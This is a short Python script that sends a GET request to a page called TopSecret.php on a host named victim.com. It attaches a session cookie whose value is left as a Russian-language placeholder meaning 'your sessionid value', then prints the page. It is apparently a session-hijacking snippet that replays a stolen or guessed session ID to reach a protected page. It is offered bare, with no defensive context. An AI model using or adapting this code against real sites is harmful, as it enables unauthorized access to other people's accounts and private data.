import requests

url = 'http://victim.com/TopSecret.php'
cookies = {'261201081285': 'ваше_значение_sessionid'}
response = requests.get(url, cookies=cookies)

print(response.text)
